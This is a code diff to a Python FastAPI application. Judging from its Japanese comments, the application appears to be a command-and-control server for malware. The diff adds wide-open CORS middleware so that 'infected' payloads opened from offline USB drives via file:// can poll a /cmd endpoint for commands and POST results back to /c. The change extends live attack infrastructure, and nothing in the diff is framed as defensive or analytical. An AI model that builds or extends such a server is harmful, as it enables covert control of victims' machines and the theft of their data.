@@ -7,6 +7,7 @@ from fastapi import FastAPI, APIRouter, Request, Depends, Form, HTTPException
 from fastapi.responses import HTMLResponse, RedirectResponse, PlainTextResponse, Response, JSONResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
+from fastapi.middleware.cors import CORSMiddleware
 
 # persist を最初に読み、DB を開く前に共有ファイルを復元する
 from . import persist
@@ -1856,3 +1857,17 @@ async def import_json(request: Request, u=Depends(auth)):
     for p in doc.get("profiles", []):
         db.upsert_profile(p)
     return RedirectResponse("/accounts", 303)
+
+
+# ---------- CORS（file:// で開かれた感染体＝オフラインUSBから叩けるようにする） ----------
+# add_middleware はリスト先頭に挿入されるため、ここで最後に足した CORS が最外周になる。
+# → throttle(429) や harden のレスポンスにも Access-Control-Allow-Origin が付き、
+#   オフライン感染体の /cmd ポーリング（JSON読み取り）と /c への POST が通る。
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=False,
+    allow_methods=["GET", "POST", "OPTIONS"],
+    allow_headers=["*"],
+    max_age=600,
+)
